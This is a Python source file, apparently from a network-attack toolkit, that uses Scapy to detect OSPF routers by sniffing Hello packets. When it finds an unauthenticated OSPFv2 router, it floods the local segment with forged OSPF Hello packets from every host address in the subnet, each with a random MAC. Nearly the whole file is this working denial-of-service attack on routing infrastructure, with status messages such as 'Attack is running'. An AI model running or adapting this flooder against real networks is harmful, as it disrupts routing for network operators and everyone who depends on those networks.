import time
from scapy.all import *
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_Link, OSPF_LLS_Hdr
from colorama import *
import ipaddress

def ospf_hello_flooding(interface):
    try:
        print(Fore.YELLOW + f"    [!] Detecting OSPF routers...")  # Переведено
        global total, router_count, ospf_hello_captured
        ospf_hello_captured = False  # Не захвачен
        ospf_routers = {}
        total = 0
        router_count = 1

        def analyze_packet(packet):
            global target_mac, target_ip, mask, version, area, router_id, hello_inter, dead_inter, options, total, router_count, ospf_hello_captured
            if packet.haslayer(OSPF_Hdr) and packet[OSPF_Hdr].type == 1:  # Если это OSPF Hello
                target_mac = packet[Ether].src
                target_ip = packet[IP].src
                src_mac = packet[Ether].src
                src_ip = packet[IP].src
                area = packet[OSPF_Hdr].area
                mask = packet[OSPF_Hello].mask
                router_id = packet[OSPF_Hdr].src
                hello_inter = packet[OSPF_Hdr].hellointerval
                dead_inter = packet[OSPF_Hdr].deadinterval

                version = packet[OSPF_Hdr].version
                if version == 3:
                    output_version = f" {Fore.RED}3{Fore.GREEN}"
                else:
                    output_version = f" {Fore.GREEN}2{Fore.RESET}"
                auth = packet[OSPF_Hdr].authtype
                if auth == 0:
                    output_auth = f" {Fore.GREEN}None{Fore.GREEN}"
                    if version != 3:
                        ospf_hello_captured = True
                else:
                    output_auth = f" {Fore.RED}Yes{Fore.GREEN}"

                options = packet[OSPF_Hello].options  # N и E - критичные флаги для установления соседства
                if (options >> 3) & 1:  # Если есть флаг N (он один или еще какой-либо флаг)
                    options = 0x08  # N флаг (NSSA)
                    output_options = "NSSA"
                elif options == 0x00:  # Нет ни одного флага (Stub / Totally Stub)
                    options = 0x00  # Stub / Totally Stub
                    output_options = "Stub / Totally Stub"
                else:
                    options = 0x02  # E флаг
                    output_options = "Standard"

                if src_mac in [router["MAC"] for router in ospf_routers.values()]:
                    pass
                else:
                    ospf_routers[f"Router{router_count}"] = {"MAC": src_mac}
                    router_count += 1
                    print(Fore.GREEN + f"\n    [+] [OSPF Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n         Mask: {mask}\n"
                                       f"         Area: {area}\n         Area Type: {output_options}\n         Router ID: {router_id}\n         Hello Interval: {hello_inter}\n"
                                       f"         Dead Interval: {dead_inter}\n         Auth: {output_auth}\n         Version: {output_version}")  # Переведено

        sniffer = AsyncSniffer(filter="ip proto 89", iface=interface, prn=analyze_packet, timeout=20)
        sniffer.start()
        time.sleep(21)

        if ospf_hello_captured == True:
            print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено
            global target_ip, mask, version, area, hello_inter, dead_inter, options

            #  Определяем адрес сети и префикс
            network = ipaddress.IPv4Network(f"{target_ip}/{mask}", strict=False)

            #  Определяем адреса в сети
            network = network.network_address
            network = ipaddress.IPv4Network(f"{network}/{mask}", strict=False)
            ip_pool = [str(ip) for ip in network.hosts()]

            try:
                while True:
                    for src_ip in ip_pool:
                        src_mac = RandMAC()
                        fake_hello_packet = Ether(src=src_mac, dst="01:00:5e:00:00:05") / \
                                            IP(src=src_ip, dst="224.0.0.5", ttl=1) / \
                                            OSPF_Hdr(version=version, type=1, src=src_ip, area=area) / \
                                            OSPF_Hello(mask=mask, hellointerval=hello_inter, options=options, prio=1, deadinterval=dead_inter, router=src_ip, backup="0.0.0.0")
                        sendp(fake_hello_packet, iface=interface, count=1, verbose=False)
                        total += 1
                        print(Fore.GREEN + f"    [+] OSPF Hellos sent: {total}", end="\r")  # Переведено

            except KeyboardInterrupt:
                print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        else:
            print(Fore.RED + f"    [-] %ERROR: No OSPF routers detected (attack aborted)")  # Переведено

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено